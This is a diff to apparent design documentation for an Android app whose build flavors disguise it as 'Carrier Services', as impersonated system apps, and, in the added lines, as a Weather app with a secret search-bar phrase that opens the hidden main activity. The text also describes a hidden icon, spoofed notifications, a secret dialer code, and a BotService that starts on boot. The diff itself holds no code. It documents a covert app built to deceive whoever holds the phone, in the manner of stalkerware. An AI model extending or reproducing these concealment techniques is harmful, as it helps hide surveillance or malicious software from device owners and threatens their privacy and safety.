@@ -45,11 +45,13 @@ graph TD
         O["original<br/>Standard launcher icon"]
         CP["captivePortal<br/>Disguised as Carrier Services"]
         DE["decoyEngine<br/>Dynamic app camouflage"]
+        WE["weather<br/>Disguised as Weather App"]
     end
 
     APP --> O
     APP --> CP
     APP --> DE
+    APP --> WE
     SETUP -->|"RSA-2048 encrypted handover"| APP
     SETUP -->|"Main app requests uninstallation"| X["🗑️ Uninstalled"]
 ```
@@ -64,6 +66,7 @@ graph TD
 | `original` | Standard app with launcher icon | None (dev/debug) |
 | `captivePortal` | Disguised as "Carrier Services" | Hidden icon, camouflaged notifications, QS tile access |
 | `decoyEngine` | Impersonates installed system apps | Dynamic notification spoofing, DecoyActivity tap targets |
+| `weather` | Disguised as "Weather" App | Full stealth UI cover, context-aware live notifications, search-bar intercept |
 
 ---
 
@@ -224,6 +227,11 @@ app/src/
 │   │   └── Notifier.kt             # Carrier-specific camouflaged notifications
 │   └── res/                        # Disguised icons, camo_strings
 │
+├── weather/                        # Weather App camouflage
+│   ├── AndroidManifest.xml         # taskAffinity isolation, Intent interception
+│   ├── java/.../                   # Authentic Weather UI logic, Retrofit integrations
+│   └── res/                        # Authentic adaptive icons, dynamic live camo_strings
+│
 └── decoyEngine/                    # Shared camouflage library
     ├── AndroidManifest.xml
     └── java/.../
@@ -296,8 +304,9 @@ The app has **no launcher icon** in stealth flavors. Access methods:
 |--------|--------|-----|
 | **Dialer Code** | All (via decoyEngine) | Dial `*#*#9131#*#*` → `CodeReceiver` intercepts → launches `MainActivity` |
 | **QS Tile** | captivePortal | ON, OFF, ON and HOLD Quick Settings tile → `TileActivity` → `MainActivity` |
+| **App Search** | weather | Type `superior chat` into weather search bar → hit Search key → launches `MainActivity` |
 | **Boot** | All | `BootReceiver` starts `BotService` on `BOOT_COMPLETED` |
-| **Launcher** | original only | Standard app drawer icon (debug/dev use) |
+| **Launcher** | original, weather | Standard app drawer icon (debug/dev or weather disguise) |
 
 ---
 
